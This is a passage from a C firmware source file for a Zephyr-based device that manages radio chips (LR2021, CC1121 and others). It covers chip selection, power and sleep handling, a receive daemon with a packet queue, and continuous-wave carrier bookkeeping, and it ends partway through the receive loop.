/**
 * @file akira_rf_api.c
 * @brief RF API — self-contained raw-RF stack for WASM/shell access
 */

#include "akira_api.h"
#include <crystal/akira_seal.h>
#include "akira_rf_api.h"
#include <runtime/security.h>
#include <zephyr/logging/log.h>
#include "connectivity/radio_interface.h"
#if defined(CONFIG_AKIRA_LR2021)
#include "../drivers/rf/lr2021.h"
#endif
#if defined(CONFIG_AKIRA_CC1121)
#include "../drivers/rf/cc1121.h"
#endif
#if defined(CONFIG_AKIRA_LR1121)
#include "../drivers/rf/lr1121.h"
#endif
#if defined(CONFIG_AKIRA_CC1101)
#include "../drivers/rf/cc1101.h"
#endif
#if defined(CONFIG_AKIRA_NRF24L01)
#include "../drivers/rf/nrf24l01.h"
#endif
#include <lib/mem_helper.h>
#include <string.h>
#include <zephyr/sys/util.h>
#include <zephyr/sys/atomic.h>
#include <zephyr/init.h>
#include <akira_app_containment.h>
#include "akira_wasm_mem.h"
#ifdef CONFIG_WIFI
#include <zephyr/net/net_if.h>
#include <zephyr/net/net_mgmt.h>
#include <zephyr/net/wifi_mgmt.h>
#if defined(CONFIG_SOC_SERIES_ESP32S3) || defined(CONFIG_SOC_SERIES_ESP32)
#include <esp_wifi.h>
#endif
#endif
#ifdef CONFIG_AKIRA_POWER_MANAGER
#include <drivers/power/power_manager.h>
#endif

LOG_MODULE_REGISTER(akira_rf_api, CONFIG_AKIRA_LOG_LEVEL);

/* Keep-awake while a radio is selected.
 *
 * A selected radio means the RX daemon owns the chip and is (or is about to be)
 * in continuous receive; deep sleep here is sys_poweroff(), which would drop
 * whatever the caller was listening for.  We express that with the standard
 * ref-counted insomnia lock rather than a bespoke predicate, so there is one
 * mechanism to reason about — and, crucially, so the max_hold_ms deadline
 * bounds the damage if a caller selects a radio and never releases it.
 *
 * The old akira_rf_daemon_is_running() test in akira_power_should_stay_awake()
 * had no such bound: it reported "running" for as long as the thread existed
 * with a handle set, so a single `rf select` disabled auto deep-sleep for the
 * rest of the device's uptime. */
static int s_rf_insomnia = -1;

static void rf_insomnia_acquire(void)
{
#ifdef CONFIG_AKIRA_POWER_MANAGER
    if (s_rf_insomnia >= 0) {
        akira_pm_insomnia_renew(s_rf_insomnia);
        return;
    }
    s_rf_insomnia = akira_pm_insomnia_enter(
        "rf-rx", (uint32_t)CONFIG_AKIRA_RF_INSOMNIA_MAX_HOLD_S * 1000U);
#endif
}

static void rf_insomnia_release(void)
{
#ifdef CONFIG_AKIRA_POWER_MANAGER
    if (s_rf_insomnia >= 0) {
        akira_pm_insomnia_exit(s_rf_insomnia);
        s_rf_insomnia = -1;
    }
#endif
}

/* Push the max_hold deadline back while RX is legitimately armed, so a
 * receiver listening for longer than CONFIG_AKIRA_RF_INSOMNIA_MAX_HOLD_S
 * isn't dropped into deep sleep mid-capture. Called from the RX daemon
 * (so unused when the daemon is compiled out). */
static __maybe_unused void rf_insomnia_renew(void)
{
#ifdef CONFIG_AKIRA_POWER_MANAGER
    if (s_rf_insomnia >= 0) {
        akira_pm_insomnia_renew(s_rf_insomnia);
    }
#endif
}

/* Serializes init/select/deinit AND data-path bus ops (single operator). */
static K_MUTEX_DEFINE(s_chip_lock);

/* Cooperative daemon pause: while set, the RX daemon parks at the top of its
 * loop and never grabs the chip lock, so a raw capture/replay can own the chip
 * without racing it. This is a SAFE stop/start — never k_thread_suspend() the
 * daemon, which could freeze it mid-recv while holding s_chip_lock (deadlock). */
static atomic_t s_rf_daemon_paused = ATOMIC_INIT(0);

#ifdef CONFIG_AKIRA_RF_RX_DAEMON
/* Idle gate for the RX daemon.  With no radio selected (the default — nothing
 * calls akira_rf_init()/akira_rf_select() at boot) the daemon used to spin at
 * 10 Hz forever doing nothing.  It now blocks here instead and is woken by
 * rf_daemon_kick() from every path that can make it useful again.
 *
 * IMPORTANT: any future code path that assigns g_active_handle or clears
 * s_rf_daemon_paused MUST call rf_daemon_kick(), or RX stops silently. */
static K_SEM_DEFINE(s_rf_daemon_wake, 0, 1);
static inline void rf_daemon_kick(void) { k_sem_give(&s_rf_daemon_wake); }
#else
static inline void rf_daemon_kick(void) { }
#endif

static inline void akira_rf_daemon_pause(void)  { atomic_set(&s_rf_daemon_paused, 1); }
static inline void akira_rf_daemon_resume(void) { atomic_set(&s_rf_daemon_paused, 0); rf_daemon_kick(); }

#define CHIP_LOCK_TIMEOUT_MS 2000

/* RX queue: the daemon fills it; akira_rf_receive() drains it (decoupled from
 * the chip). Shared, so defined here ahead of both users. */
#define RF_RX_MAX_PACKET    255
struct rf_rx_packet { uint8_t data[RF_RX_MAX_PACKET]; uint16_t len; };

/* Queue storage (~2 KB) lives in PSRAM via AKIRA_BULK_BSS: k_msgq only
 * memcpy()s into/out of it, it is never a DMA target.  (The old guard tested
 * CONFIG_SPIRAM, which ESP builds never define — they use CONFIG_ESP_SPIRAM —
 * so this sat in internal DRAM.)  The queue is initialised once at boot, so a
 * receive that runs before any radio is selected waits on a valid queue
 * instead of a zeroed one. */
static char AKIRA_BULK_BSS __aligned(4)
    s_rf_rx_buf[CONFIG_AKIRA_RF_RX_QUEUE_DEPTH * sizeof(struct rf_rx_packet)];
static struct k_msgq s_rf_rx_msgq;

static int rf_rx_msgq_sys_init(void)
{
    k_msgq_init(&s_rf_rx_msgq, s_rf_rx_buf, sizeof(struct rf_rx_packet),
                CONFIG_AKIRA_RF_RX_QUEUE_DEPTH);
    return 0;
}
SYS_INIT(rf_rx_msgq_sys_init, POST_KERNEL, CONFIG_KERNEL_INIT_PRIORITY_DEFAULT);

/* A CW carrier is keyed (set by akira_rf_tx_cw_start, cleared by stop and by
 * every path that drops the active radio).  The CW hop only re-keys while
 * this is set, so it can never be used to start a transmitter by itself. */
static bool s_rf_cw_active;

static akira_rf_chip_t g_active_chip = AKIRA_RF_CHIP_NONE;
static radio_handle_t *g_active_handle = NULL;
/* Per-chip init tracking: init hardware once, then just swap active handle. */
static bool s_inited[AKIRA_RF_CHIP_MAX];

/* Handle that akira_rf_sleep_if_idle() actually slept — wake() must target
 * this, not g_active_handle at wake time, which may have changed via a shell
 * `rf select`. */
static radio_handle_t *s_rf_slept_handle;

/* A client (receiver) currently needs the active radio in continuous RX.
 * The RX daemon only arms the chip and runs while this is set, and the
 * deep-sleep keep-awake lock is held only across the 0->1..1->0 window — so a
 * merely-selected (but silent) radio neither receives forever nor blocks deep
 * sleep. This is what "idle" means for akira_rf_sleep_if_idle(). */
static atomic_t s_rf_rx_armed = ATOMIC_INIT(0);

/* Mark the active radio as needing continuous RX (idempotent). Takes the
 * keep-awake lock and wakes the daemon only on the 0->1 edge. */
static void rf_rx_arm(void)
{
    if (!g_active_handle) {
        return;  /* nothing selected — a recv with no radio can't arm anything */
    }
    if (atomic_set(&s_rf_rx_armed, 1) == 0) {   /* 0 -> 1 edge */
        rf_insomnia_acquire();
        rf_daemon_kick();
    }
}

/* Drop the RX-needed state (idempotent). Releases the keep-awake lock on the
 * 1->0 edge; the daemon parks itself at the top of its loop on the next pass. */
static void rf_rx_disarm(void)
{
    if (atomic_set(&s_rf_rx_armed, 0) == 1) {   /* 1 -> 0 edge */
        rf_insomnia_release();
    }
}

void akira_rf_rx_disarm(void)
{
    rf_rx_disarm();
}

void akira_rf_rx_purge(void)
{
    k_msgq_purge(&s_rf_rx_msgq);
}

static radio_handle_t *map_chip_to_handle(akira_rf_chip_t chip)
{
    switch (chip) {
#if defined(CONFIG_AKIRA_LR2021)
    case AKIRA_RF_CHIP_LR2021:   return lr2021_get_handle();
#endif
#if defined(CONFIG_AKIRA_CC1121)
    case AKIRA_RF_CHIP_CC1121:   return cc1121_get_handle();
#endif
#if defined(CONFIG_AKIRA_LR1121)
    case AKIRA_RF_CHIP_LR1121:   return lr1121_get_handle();
#endif
#if defined(CONFIG_AKIRA_CC1101)
    case AKIRA_RF_CHIP_CC1101:   return cc1101_get_handle();
#endif
#if defined(CONFIG_AKIRA_NRF24L01)
    case AKIRA_RF_CHIP_NRF24L01: return nrf24l01_get_handle();
#endif
    default:                      return NULL;
    }
}

/* Caller holds s_chip_lock. Put a handle into its lowest-power sleep state
 * (CC1121 SPWD / LR2021 Standby→Sleep-with-retention — the driver decides). */
static void rf_park_locked(radio_handle_t *h)
{
    if (h && h->ops && h->ops->set_mode) {
        h->ops->set_mode(h, RADIO_MODE_SLEEP);
    }
}

/* Caller holds s_chip_lock. If this handle was put to SLEEP by
 * akira_rf_sleep_if_idle() (screen blank), bring it back to STANDBY before it
 * is driven, so TX/RX don't hit a sleeping chip. */
static void rf_wake_if_slept_locked(radio_handle_t *h)
{
    if (h && h == s_rf_slept_handle) {
        if (h->ops && h->ops->set_mode) {
            h->ops->set_mode(h, RADIO_MODE_STANDBY);
        }
        s_rf_slept_handle = NULL;
    }
}

#if defined(CONFIG_AKIRA_CC1121) || defined(CONFIG_AKIRA_LR2021)
/* Caller holds s_chip_lock. Hardware-init a chip (idempotent), keep "rf"
 * ownership of it, and park it in its lowest-power state — no select/arm. */
static void rf_boot_park_chip_locked(akira_rf_chip_t chip)
{
    radio_handle_t *h = map_chip_to_handle(chip);
    if (!h || !h->ops) {
        return;
    }
    if (h->ops->init && h->ops->init(h) < 0) {
        LOG_ERR("RF boot: '%s' init failed", h->name);
        return;
    }
    s_inited[chip] = true;
    /* Keep the historical "rf owns the boot-inited chips" model so
     * akira_rf_release_all() can hand them to the mesh later. */
    (void)radio_manager_acquire(h, "rf");
    rf_park_locked(h);    /* lowest-power state immediately */
    LOG_INF("RF boot: '%s' up and parked", h->name);
}
#endif /* CC1121 || LR2021 */

/* Caller holds s_chip_lock.  Un-key a CW carrier left on the active radio
 * before that radio is dropped, parked or handed over.  Returns true if CW
 * was active — the caller then resumes the RX daemon (CW start paused it)
 * once it has released the lock. */
static bool rf_cw_drop_locked(void)
{
    if (!s_rf_cw_active) {
        return false;
    }
#if defined(CONFIG_AKIRA_LR2021)
    if (g_active_chip == AKIRA_RF_CHIP_LR2021) {
        (void)lr2021_tx_cw_stop();
    }
#endif
    s_rf_cw_active = false;
    return true;
}

int akira_rf_init(akira_rf_chip_t chip)
{
    LOG_INF("RF init: chip=%d", chip);

    radio_handle_t *handle = map_chip_to_handle(chip);
    if (!handle) {
        LOG_ERR("Unsupported chip type: %d", chip);
        return -EINVAL;
    }

    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
        return -EBUSY;
    }

    if (!handle->ops) {
        LOG_ERR("Radio %d has no ops (stub)", chip);
        k_mutex_unlock(&s_chip_lock);
        return -ENODEV;
    }

    /* ops->init is idempotent and, for an already-inited chip parked asleep at
     * boot, also wakes it back to Standby. */
    int ret = 0;
    if (handle->ops->init) {
        ret = handle->ops->init(handle);
    }
    if (ret < 0) {
        LOG_ERR("Radio '%s' init failed: %d", handle->name, ret);
        k_mutex_unlock(&s_chip_lock);
        return ret;
    }

    int aret = radio_manager_acquire(handle, "rf");
    if (aret < 0) {
        LOG_ERR("Radio '%s' busy (owned elsewhere): %d", handle->name, aret);
        k_mutex_unlock(&s_chip_lock);
        return aret;
    }

    bool was_active = (g_active_handle == handle);
    bool cw_dropped = false;

    /* Switching active radio: stop any RX/CW on the old one and park it. */
    if (g_active_handle && !was_active) {
        rf_rx_disarm();
        cw_dropped = rf_cw_drop_locked();
        rf_park_locked(g_active_handle);
    }
    s_inited[chip] = true;
    g_active_chip = chip;
    g_active_handle = handle;

    /* Make the selected radio ready (Standby) but do NOT arm continuous RX or
     * take the keep-awake lock — those happen only when a client actually
     * receives (akira_rf_receive/recv_pop) or mesh starts. Leave an already-
     * active, actively-receiving chip alone so re-init doesn't drop its RX. */
    if (!(was_active && atomic_get(&s_rf_rx_armed))) {
        rf_wake_if_slept_locked(handle);
        if (handle->ops->set_mode) {
            handle->ops->set_mode(handle, RADIO_MODE_STANDBY);
        }
    }

    k_mutex_unlock(&s_chip_lock);
    if (cw_dropped) {
        akira_rf_daemon_resume();  /* CW start had paused it */
    }
    LOG_INF("RF radio '%s' initialized (standby, RX idle)", handle->name);
    return 0;
}

int akira_rf_boot_init(void)
{
    LOG_INF("RF boot init: bring up + park all chips");

    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
        return -EBUSY;
    }

    /* Same chips main() used to init one-by-one, now brought up and parked. */
#if defined(CONFIG_AKIRA_CC1121)
    rf_boot_park_chip_locked(AKIRA_RF_CHIP_CC1121);
#endif
#if defined(CONFIG_AKIRA_LR2021)
    rf_boot_park_chip_locked(AKIRA_RF_CHIP_LR2021);
#endif

    /* Deliberately leave g_active_chip/g_active_handle unset: no default active
     * radio, daemon stays blocked, no insomnia lock. */
    k_mutex_unlock(&s_chip_lock);
    return 0;
}

int akira_rf_deinit(void)
{
    LOG_INF("RF deinit");

    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
        return -EBUSY;
    }

    bool cw_dropped = rf_cw_drop_locked();
    radio_handle_t *h = g_active_handle;
    if (h && h->ops && h->ops->deinit) {
        h->ops->deinit(h);
    }
    if (g_active_chip != AKIRA_RF_CHIP_NONE) {
        s_inited[g_active_chip] = false;
    }
    if (g_active_handle) {
        radio_manager_release(g_active_handle, "rf");
        g_active_handle = NULL;
    }
    g_active_chip = AKIRA_RF_CHIP_NONE;
    s_rf_slept_handle = NULL;

    k_mutex_unlock(&s_chip_lock);
    rf_rx_disarm();  /* stop RX intent + drop the keep-awake lock */
    if (cw_dropped) {
        akira_rf_daemon_resume();
    }
    return 0;
}

int akira_rf_release_all(void)
{
    LOG_INF("RF release ownership (no power-down)");

    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
        return -EBUSY;
    }

    /* Never hand a chip over (e.g. to the mesh) with a carrier still keyed. */
    bool cw_dropped = rf_cw_drop_locked();

    for (int c = AKIRA_RF_CHIP_NONE + 1; c < AKIRA_RF_CHIP_MAX; c++) {
        if (!s_inited[c]) continue;
        radio_handle_t *h = map_chip_to_handle((akira_rf_chip_t)c);
        if (h) {
            radio_manager_release(h, "rf");
        }
    }
    g_active_handle = NULL;
    g_active_chip = AKIRA_RF_CHIP_NONE;
    s_rf_slept_handle = NULL;

    k_mutex_unlock(&s_chip_lock);
    rf_rx_disarm();  /* stop RX intent + drop the keep-awake lock */
    if (cw_dropped) {
        akira_rf_daemon_resume();
    }
    return 0;
}

void akira_rf_note_chip_deinit(const radio_handle_t *h)
{
    if (!h) {
        return;
    }
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
        /* akira_rf_select() re-runs the (idempotent) ops->init anyway, so a
         * stale flag only costs a no-op park in akira_rf_sleep_all(). */
        return;
    }
    for (int c = AKIRA_RF_CHIP_NONE + 1; c < AKIRA_RF_CHIP_MAX; c++) {
        if (map_chip_to_handle((akira_rf_chip_t)c) == h) {
            s_inited[c] = false;
        }
    }
    if (s_rf_slept_handle == h) {
        s_rf_slept_handle = NULL;
    }
    k_mutex_unlock(&s_chip_lock);
}

int akira_rf_select(akira_rf_chip_t chip)
{
    LOG_INF("RF select: chip=%d", chip);

    if (chip == AKIRA_RF_CHIP_NONE) {
        return -EINVAL;
    }

    radio_handle_t *handle = map_chip_to_handle(chip);
    if (!handle) {
        LOG_ERR("Unsupported chip type: %d", chip);
        return -EINVAL;
    }

    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
        return -EBUSY;
    }

    if (chip == g_active_chip) {
        /* Re-selecting the active radio: just make sure it is awake.  Standby
         * also un-keys a CW carrier, so drop that state with it. */
        bool cw_dropped = false;
        if (handle->ops && handle->ops->set_mode) {
            rf_wake_if_slept_locked(handle);
            handle->ops->set_mode(handle, RADIO_MODE_STANDBY);
            cw_dropped = s_rf_cw_active;
            s_rf_cw_active = false;
        }
        k_mutex_unlock(&s_chip_lock);
        if (cw_dropped) {
            akira_rf_daemon_resume();
        }
        return 0;
    }

    /* Hardware-init the chip.  ops->init is idempotent (an already-up chip
     * keeps its config; one parked asleep is woken), so run it on every
     * selection rather than trusting s_inited[]: another owner (the mesh's
     * akira_mesh_stop()) may have deinit'ed the chip behind our back, and a
     * stale flag then made every later call fail with -ENODEV. */
    {
        int ret = 0;
        if (handle->ops && handle->ops->init) {
            ret = handle->ops->init(handle);
        }
        if (ret < 0) {
            LOG_ERR("Radio %d init failed: %d", chip, ret);
            k_mutex_unlock(&s_chip_lock);
            return ret;
        }
        s_inited[chip] = true;
    }

    bool cw_dropped = false;
    if (g_active_handle && g_active_handle != handle) {
        /* Deselect the previous radio: stop its RX/CW, drop the lock, park it. */
        rf_rx_disarm();
        cw_dropped = rf_cw_drop_locked();
        rf_park_locked(g_active_handle);
        radio_manager_release(g_active_handle, "rf");
        g_active_handle = NULL;
        g_active_chip = AKIRA_RF_CHIP_NONE;
    }
    int aret = radio_manager_acquire(handle, "rf");
    if (aret < 0) {
        k_mutex_unlock(&s_chip_lock);
        if (cw_dropped) {
            akira_rf_daemon_resume();
        }
        return aret;
    }
    g_active_handle = handle;
    g_active_chip = chip;
    s_rf_slept_handle = NULL;

    /* Wake the chosen radio to Standby — ready for TX or for a client to arm
     * RX, but not receiving (and not blocking deep sleep) until it does. */
    if (handle->ops && handle->ops->set_mode) {
        handle->ops->set_mode(handle, RADIO_MODE_STANDBY);
    }

    k_mutex_unlock(&s_chip_lock);
    if (cw_dropped) {
        akira_rf_daemon_resume();
    }
    LOG_INF("RF active radio set to chip=%d (%s), standby", chip, handle->name);
    return 0;
}

int akira_rf_send(const uint8_t *data, size_t len)
{
    if (!data || len == 0) return -EINVAL;
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
    radio_handle_t *h = g_active_handle;
    rf_wake_if_slept_locked(h);  /* a TX on a blank-slept radio must wake it first */
    int ret = (h && h->ops && h->ops->send) ? h->ops->send(h, data, len) : -ENODEV;
    k_mutex_unlock(&s_chip_lock);
    return ret;
}

int akira_rf_receive(uint8_t *buf, size_t max_len, uint32_t timeout_ms)
{
    if (!buf || max_len == 0) return -EINVAL;
    /* A caller waiting for packets is a receiver: arm continuous RX (idempotent)
     * and hold off deep sleep while it listens. */
    rf_rx_arm();
    /* Pull from the daemon's RX queue rather than touching the chip directly —
     * the daemon owns the (continuous) RX path. Avoids racing the daemon for
     * the chip and works for both interrupt-driven and polling radios. */
    struct rf_rx_packet pkt;
    if (k_msgq_get(&s_rf_rx_msgq, &pkt, K_MSEC(timeout_ms)) != 0) {
        return 0;  /* timeout, no packet */
    }
    size_t n = (pkt.len < max_len) ? pkt.len : max_len;
    memcpy(buf, pkt.data, n);
    return (int)n;
}

int akira_rf_set_frequency(uint32_t freq_hz)
{
    LOG_DBG("RF set frequency: %u Hz", freq_hz);
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
    radio_handle_t *h = g_active_handle;
    int ret = (h && h->ops && h->ops->set_frequency) ? h->ops->set_frequency(h, freq_hz) : -ENODEV;
    k_mutex_unlock(&s_chip_lock);
    return ret;
}

int akira_rf_set_power(int8_t dbm)
{
    LOG_DBG("RF set power: %d dBm", dbm);
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
    radio_handle_t *h = g_active_handle;
    int ret = (h && h->ops && h->ops->set_power) ? h->ops->set_power(h, dbm) : -ENODEV;
    k_mutex_unlock(&s_chip_lock);
    return ret;
}

int akira_rf_set_bitrate(uint32_t bps)
{
    LOG_DBG("RF set bitrate: %u bps", bps);
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
    radio_handle_t *h = g_active_handle;
    int ret = (h && h->ops && h->ops->set_bitrate) ? h->ops->set_bitrate(h, bps) : -ENODEV;
    k_mutex_unlock(&s_chip_lock);
    return ret;
}

int akira_rf_set_modulation(radio_modulation_t mod)
{
    LOG_DBG("RF set modulation: %d", mod);
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
    radio_handle_t *h = g_active_handle;
    int ret = (h && h->ops && h->ops->set_modulation) ? h->ops->set_modulation(h, mod) : -ENODEV;
    k_mutex_unlock(&s_chip_lock);
    return ret;
}

/* g_active_handle is NULL whenever no owner is currently registered through
 * akira_rf_init()/akira_rf_select() (e.g. mesh init released it via
 * akira_rf_release_all() and never handed it back) — but the LR2021 is still
 * live and receiving on whatever SF/BW it was last given. Without this
 * fallback, SF/BW changes silently no-op (-ENODEV) against a chip that's
 * actually on the air. */
static radio_handle_t *rf_phy_handle(void)
{
    return g_active_handle ? g_active_handle : radio_manager_get_by_name("LR2021");
}

/* phy_fallback=false (the WASM path): only ever touch a radio the RF API has
 * selected.  The LR2021 fallback is exactly the chip the mesh owns while RF
 * owns nothing — driving it from here interleaves SPI with mesh_mac's own
 * threads (which take the handle lock, not s_chip_lock) and wedges BUSY. */
static int rf_set_sf_impl(uint8_t sf, bool phy_fallback)
{
    LOG_DBG("RF set LoRa SF: %u", sf);
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
    radio_handle_t *h = phy_fallback ? rf_phy_handle() : g_active_handle;
    int ret = (h && h->ops && h->ops->set_spreading_factor) ? h->ops->set_spreading_factor(h, sf)
              : ((h || phy_fallback) ? -ENODEV : -EBUSY);
    k_mutex_unlock(&s_chip_lock);
    return ret;
}

static int rf_set_bw_impl(uint32_t bw_hz, bool phy_fallback)
{
    LOG_DBG("RF set BW: %u Hz", bw_hz);
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
    radio_handle_t *h = phy_fallback ? rf_phy_handle() : g_active_handle;
    int ret = (h && h->ops && h->ops->set_bandwidth) ? h->ops->set_bandwidth(h, bw_hz)
              : ((h || phy_fallback) ? -ENODEV : -EBUSY);
    k_mutex_unlock(&s_chip_lock);
    return ret;
}

int akira_rf_set_spreading_factor(uint8_t sf)
{
    return rf_set_sf_impl(sf, true);
}

int akira_rf_set_bandwidth(uint32_t bw_hz)
{
    return rf_set_bw_impl(bw_hz, true);
}

int akira_rf_set_coding_rate(uint8_t cr)
{
    LOG_DBG("RF set LoRa CR: 4/%u", cr);
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
    radio_handle_t *h = g_active_handle;
    int ret = (h && h->ops && h->ops->set_coding_rate) ? h->ops->set_coding_rate(h, cr) : -ENODEV;
    k_mutex_unlock(&s_chip_lock);
    return ret;
}

int akira_rf_set_lora_hopping(bool enable, uint16_t hop_period_syms,
                               const uint32_t *freqs, uint8_t num_freqs)
{
    LOG_DBG("RF set LoRa hopping: %s", enable ? "enable" : "disable");
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
    radio_handle_t *h = rf_phy_handle();
    int ret = (h && h->ops && h->ops->set_lora_hopping) ?
              h->ops->set_lora_hopping(h, enable, hop_period_syms, freqs, num_freqs) : -ENODEV;
    k_mutex_unlock(&s_chip_lock);
    return ret;
}

int akira_rf_get_rssi(int16_t *rssi)
{
    if (!rssi) return -EINVAL;
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
        *rssi = RADIO_RSSI_UNAVAILABLE; return -EBUSY;
    }
    radio_handle_t *h = g_active_handle;
    int ret;
    if (h && h->ops && h->ops->get_rssi) {
        ret = h->ops->get_rssi(h, rssi);
        if (ret == -ENOSYS) *rssi = RADIO_RSSI_UNAVAILABLE;
    } else {
        *rssi = RADIO_RSSI_UNAVAILABLE; ret = -ENODEV;
    }
    k_mutex_unlock(&s_chip_lock);
    return ret;
}

radio_handle_t *akira_rf_get_active_handle(void)
{
    return g_active_handle;
}

bool akira_rf_daemon_is_running(void)
{
#ifdef CONFIG_AKIRA_RF_RX_DAEMON
    /* "Running" == a client has RX armed on the active radio. */
    return (g_active_handle != NULL) && atomic_get(&s_rf_rx_armed) &&
           !atomic_get(&s_rf_daemon_paused);
#else
    return false;
#endif
}

int akira_rf_sleep_if_idle(void)
{
    if (!g_active_handle) return -ENODEV;
    /* "Idle" == no client currently needs RX. If one does, leave the radio in
     * continuous RX so blanking doesn't drop its packets. (TOCTOU: re-checked
     * under the lock below.) */
    if (atomic_get(&s_rf_rx_armed)) return -EBUSY;
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
    if (atomic_get(&s_rf_rx_armed)) {
        k_mutex_unlock(&s_chip_lock);
        return -EBUSY;
    }
    /* Holding s_chip_lock also means no TX is in flight (akira_rf_send holds it
     * for the whole send), so this is genuinely idle. */
    radio_handle_t *h = g_active_handle;
    int ret = (h && h->ops && h->ops->set_mode) ? h->ops->set_mode(h, RADIO_MODE_SLEEP) : -ENODEV;
    bool cw_dropped = false;
    if (ret == 0) {
        s_rf_slept_handle = h;
        /* Sleep un-keys a CW carrier: keep the flag honest, and give the RX
         * daemon back (CW start paused it). */
        cw_dropped = s_rf_cw_active;
        s_rf_cw_active = false;
    }
    k_mutex_unlock(&s_chip_lock);
    if (cw_dropped) {
        akira_rf_daemon_resume();
    }
    return ret;
}

int akira_rf_wake(void)
{
    if (!s_rf_slept_handle) return 0;
    if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) return -EBUSY;
    radio_handle_t *h = s_rf_slept_handle;
    s_rf_slept_handle = NULL;
    int ret = (h && h->ops && h->ops->set_mode) ? h->ops->set_mode(h, RADIO_MODE_STANDBY) : -ENODEV;
    /* Only sleep_if_idle() (RX not armed) could have slept it, so the restored
     * state is Standby. If a client armed RX meanwhile, hand it back to the
     * daemon to re-arm continuous RX. */
    if (ret == 0 && atomic_get(&s_rf_rx_armed)) {
        rf_daemon_kick();
    }
    k_mutex_unlock(&s_chip_lock);
    return ret;
}

int akira_rf_sleep_all(void)
{
    LOG_INF("RF sleep all (pre-deep-sleep park)");

    /* Stop the daemon re-arming and drop the keep-awake first, so nothing
     * re-arms RX behind us. The daemon parks cooperatively at the top of its
     * loop; it never holds s_chip_lock while idle. */
    akira_rf_daemon_pause();
    atomic_set(&s_rf_rx_armed, 0);
    rf_insomnia_release();

    /* Generous timeout: the daemon may own the lock for one in-flight recv
     * (up to ~2 s) — same reasoning as akira_rf_raw_capture(). */
    int ret = 0;
    if (k_mutex_lock(&s_chip_lock, K_MSEC(5000)) == 0) {
        for (int c = AKIRA_RF_CHIP_NONE + 1; c < AKIRA_RF_CHIP_MAX; c++) {
            if (!s_inited[c]) continue;
            rf_park_locked(map_chip_to_handle((akira_rf_chip_t)c));
        }
        s_rf_slept_handle = NULL;
        s_rf_cw_active = false;  /* parking un-keyed any CW carrier */
        k_mutex_unlock(&s_chip_lock);
    } else {
        LOG_WRN("RF sleep all: chip lock timeout — radios may stay powered");
        ret = -EBUSY;
    }

    /* Leave the daemon paused: we are going down anyway, and on ESP32 deep
     * sleep the chip reboots, re-running akira_rf_boot_init() fresh. */
    return ret;
}

#ifdef CONFIG_AKIRA_RF_RX_DAEMON

#define RF_DAEMON_SLEEP_MS  100

/* Stays in internal DRAM on purpose: recv() reads the radio FIFO straight
 * into it over SPI2, which is DMA-driven (the old CONFIG_SPIRAM guard that
 * would have moved it to PSRAM was never true on ESP builds anyway). */
static struct rf_rx_packet s_rf_poll_buf;

static void rf_rx_daemon_fn(void *p1, void *p2, void *p3)
{
    ARG_UNUSED(p1); ARG_UNUSED(p2); ARG_UNUSED(p3);
    while (1) {
        /* Idle states below are all edge-triggered: nothing changes until some
         * other thread selects a radio or resumes the daemon, and every such
         * path calls rf_daemon_kick().  Block instead of polling — this thread
         * would otherwise wake 10x/s for the entire life of the device. */
        radio_handle_t *h = g_active_handle;
        if (!h || !h->ops || !h->ops->recv ||
            atomic_get(&s_rf_daemon_paused) ||
            !atomic_get(&s_rf_rx_armed)) {
            /* No radio selected, paused for a raw capture, or no client wants
             * RX right now — block until a path that changes that kicks us. */
            k_sem_take(&s_rf_daemon_wake, K_FOREVER);
            continue;  /* re-read g_active_handle; conditions may still hold */
        }

        /* RX is wanted: keep the keep-awake deadline fresh for long listens,
         * and make sure the chip wasn't left asleep by a blank that raced the
         * arm. */
        rf_insomnia_renew();

        int n;
        if (h->ops->rx_wait) {
            /* Interrupt-driven continuous RX. recv() (under the lock, briefly)
             * arms continuous RX on first call and reads any pending packet
             * non-blocking. rx_wait() then blocks LOCK-FREE on the IRQ until the
             * next packet — the chip never leaves RX (no gap) and the lock is
             * free while idle (no starvation). */
            if (k_mutex_lock(&s_chip_lock, K_MSEC(CHIP_LOCK_TIMEOUT_MS)) != 0) {
                k_msleep(RF_DAEMON_SLEEP_MS); continue;
            }
            rf_wake_if_slept_locked(h);  /* a blank may have slept it before arm */
            n = h->ops->recv(h, s_rf_poll_buf.data, RF_RX_MAX_PACKET, 0);
            k_mutex_unlock(&s_chip_lock);
            if (n <= 0) { h->ops->rx_wait(h, 1000); continue; }  /* wait next IRQ */
        } else {
            /* Polling radios: short window so the lock is released frequently. */
            if (k_mutex_lock(&s_chip_lock, K_NO_WAIT) != 0) {
                k_msleep(RF_DAEMON_SLEEP_MS); continue;
            }
            rf_wake_if_slept_locked(h);  /* a blank may have slept it before arm */
